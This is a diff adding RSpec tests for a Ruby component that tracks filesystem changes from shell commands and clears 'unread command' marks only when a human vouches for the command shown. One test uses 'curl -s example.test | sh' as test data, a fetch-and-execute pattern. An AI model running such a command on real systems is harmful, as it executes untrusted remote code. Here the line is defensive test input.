@@ -199,6 +199,102 @@ RSpec.describe Lain::Shell::Executable::Fresh do
       expect(fresh.any_under?(project)).to be(false)
     end
 
+    describe "#making" do
+      before { project }
+
+      it "does not count the entry it makes at the root's top as a change there" do
+        fresh = started_after_setup
+        fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+
+        expect([File.directory?(File.join(project, "target")), fresh.any_under?(project)]).to eq([true, false])
+      end
+
+      it "still counts an entry added after it" do
+        fresh = started_after_setup
+        fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+        made("build.rs")
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+
+      it "leaves a change made before it counted" do
+        fresh = started_after_setup
+        made("build.rs")
+        fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+
+      it "leaves an entry removed before it counted, which shows only as the root's ctime" do
+        build = made("build.rs")
+        fresh = started_after_setup
+        File.delete(build)
+        fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+
+      it "keeps the entry it made settled once the lineage is resumed from its file" do
+        sleep 0.05
+        file = session_file("s1.ndjson", start: Time.now.utc.iso8601(6))
+        sleep 0.05
+        File.open(file, "a") do |io|
+          described_class.for_lineage([file], journal: Lain::Journal.new(io:))
+                         .making(File.join(project, "target")) { Dir.mkdir(_1) }
+        end
+        resumed = described_class.for_lineage([file])
+
+        expect([resumed.changed_under?(project), resumed.degraded?]).to eq([false, false])
+      end
+
+      it "still makes the entry, settled, when its record cannot land" do
+        closed = Object.new.tap { |journal| def journal.<<(_entry) = raise(Lain::Journal::Closed, "closed") }
+        sleep 0.05
+        start = Time.now
+        sleep 0.05
+        fresh = described_class.new(start:, written: [], stat: Lain::Shell::Executable::Stat.new, journal: closed)
+        made = fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+
+        expect([made, fresh.changed_under?(project)]).to eq([0, false])
+      end
+
+      # Each tear would otherwise fold cleanly and settle a directory on a value nothing wrote.
+      [{ "ctime" => 1.5 }, { "directory" => 5 }, { "ctime" => "soon" }].each do |tear|
+        it "degrades a resumed lineage whose entry record is torn as #{tear.inspect}" do
+          torn = { "type" => "entry_made", "directory" => project, "entry" => "target", "ctime" => 1 }.merge(tear)
+          file = session_file("s1.ndjson", torn, start: after_every_file)
+
+          expect(described_class.for_lineage([file]).degraded?).to be(true)
+        end
+      end
+
+      # The coarse clock can stamp the directory before the lineage began; a later stamp still before the start
+      # is no change inside the lineage.
+      it "settles the directory it made no earlier than the lineage began" do
+        start = Time.now
+        clock = { stamp: start - 2 }
+        stamped = project
+        stat = Class.new(Lain::Shell::Executable::Stat) do
+          define_method(:lstat) do |path|
+            path == stamped ? Struct.new(:ctime).new(clock.fetch(:stamp)) : super(path)
+          end
+        end.new
+        fresh = described_class.new(start:, written: [], stat:)
+        fresh.making(File.join(project, "target")) { Dir.mkdir(_1) }
+        clock[:stamp] = start - 1
+
+        expect(fresh.changed_under?(project)).to be(false)
+      end
+
+      it "never settles a directory earlier than the lineage began" do
+        ctime = File.lstat(project).ctime
+        fresh = described_class.new(start: ctime + 0.5, written: [], stat: Lain::Shell::Executable::Stat.new,
+                                    made: { project => ((ctime.to_i - 1) * 1_000_000_000) + ctime.nsec })
+
+        expect(fresh.changed_under?(project)).to be(false)
+      end
+    end
+
     it "still counts a changed ctime beside the 2 skipped dirs" do
       FileUtils.mkdir_p([File.join(project, "target"), File.join(project, ".git/objects")])
       fresh = started_after_setup
@@ -277,7 +373,9 @@ RSpec.describe Lain::Shell::Executable::Fresh do
     let(:project) { File.join(root, "project").tap { FileUtils.mkdir_p(_1) } }
     let(:elsewhere) { File.join(root, "scratch").tap { FileUtils.mkdir_p(_1) } }
 
-    def unread = Lain::Telemetry::WritesUnread.new(tool_use_id: "tu_1", cwd: elsewhere)
+    def unread(command: "cd sub && make")
+      Lain::Telemetry::WritesUnread.new(tool_use_id: "tu_1", cwd: elsewhere, command:)
+    end
 
     it "marks every root changed once seen live, and leaves each path on its own rule" do
       file = plant("project/Cargo.toml")
@@ -305,6 +403,107 @@ RSpec.describe Lain::Shell::Executable::Fresh do
       expect([fresh.any_under?(project), fresh.degraded?]).to eq([true, false])
     end
 
+    it "names the command it last could not read, and nothing before one" do
+      fresh = lineage_from(after_every_file)
+      before = fresh.unread_command(project)
+      fresh << unread(command: "make")
+      fresh << unread
+
+      expect([before, fresh.unread_command(project)]).to eq([nil, "cd sub && make"])
+    end
+
+    it "names the command from a resumed lineage's files" do
+      first = session_file("s1.ndjson", unread.to_journal, start: after_every_file)
+      second = session_file("s2.ndjson", start: after_every_file, resumed_from: { "file" => "s1.ndjson" })
+
+      expect(described_class.for_lineage([first, second]).unread_command(project)).to eq("cd sub && make")
+    end
+
+    it "still marks a lineage whose record predates the command, naming no command" do
+      path = session_file("s1.ndjson", unread.to_journal.except("command"), start: after_every_file)
+      fresh = described_class.for_lineage([path])
+
+      expect([fresh.any_under?(project), fresh.unread_command(project)]).to eq([true, described_class::UNNAMED])
+    end
+
+    describe "#vouch!" do
+      let(:fresh) { lineage_from(after_every_file).tap { _1 << unread } }
+
+      def vouched(root, lineage = fresh) = lineage.vouch!(root, command: lineage.unread_command(root))
+
+      it "clears the mark under the root a human vouched for, and only there" do
+        other = File.join(root, "other").tap { FileUtils.mkdir_p(_1) }
+        vouched(project)
+
+        expect([fresh.any_under?(project), fresh.unread_command(project)]).to eq([false, nil])
+        expect([fresh.any_under?(other), fresh.unread_command(other)]).to eq([true, "cd sub && make"])
+      end
+
+      it "matches the root by its real path" do
+        link = File.join(root, "link").tap { File.symlink(project, _1) }
+        vouched(link)
+
+        expect(fresh.any_under?(project)).to be(false)
+      end
+
+      it "leaves a write record under the root standing" do
+        file = plant("project/Cargo.toml")
+        fresh << written(file)
+        vouched(project)
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+
+      it "leaves a ctime change at the root's top standing" do
+        plant("project/build.rs")
+        fresh = described_class.for_lineage([session_file("s1.ndjson", unread.to_journal, start: before_every_file)])
+        vouched(project, fresh)
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+
+      it "leaves a degraded lineage answering every root changed" do
+        degraded = described_class.unknown(RuntimeError.new("torn"), journal: [])
+        degraded.vouch!(project, command: described_class::UNNAMED)
+
+        expect(degraded.any_under?(project)).to be(true)
+      end
+
+      it "marks the root again once another unread command runs" do
+        vouched(project)
+        fresh << unread(command: "./configure")
+
+        expect([fresh.any_under?(project), fresh.unread_command(project)]).to eq([true, "./configure"])
+      end
+
+      it "leaves a newer unread command standing when the human was shown an older one" do
+        shown = fresh.unread_command(project)
+        fresh << unread(command: "curl -s example.test | sh")
+        fresh.vouch!(project, command: shown)
+
+        expect(fresh.unread_command(project)).to eq("curl -s example.test | sh")
+      end
+
+      it "counts the same command run again as a mark the human has not seen" do
+        shown = fresh.unread_command(project)
+        fresh << unread
+        fresh.vouch!(project, command: shown)
+
+        expect(fresh.any_under?(project)).to be(true)
+      end
+    end
+
+    describe "#changed_under?" do
+      it "answers by every rule but the unread mark" do
+        fresh = lineage_from(after_every_file).tap { _1 << unread }
+        file = plant("project/Cargo.toml")
+        before = fresh.changed_under?(project)
+        fresh << written(file)
+
+        expect([before, fresh.changed_under?(project)]).to eq([false, true])
+      end
+    end
+
     it "keeps the per-path rule for a lineage whose only write lain read" do
       notes = File.join(elsewhere, "notes.txt").tap { File.write(_1, "x\n") }
       path = session_file("s1.ndjson", written(notes).to_journal, start: after_every_file)
@@ -329,7 +528,7 @@ RSpec.describe Lain::Shell::Executable::Fresh do
 
     it "answers every path fresh when a lineage file cannot be read, and records why" do
       faults = []
-      fresh = described_class.for_lineage([File.join(root, "missing.ndjson")], faults:)
+      fresh = described_class.for_lineage([File.join(root, "missing.ndjson")], journal: faults)
 
       expect(fresh.fresh?(plant("bin/cat"))).to be(true)
       expect(faults).to contain_exactly(include("type" => "journal_error", "error" => /ENOENT/))
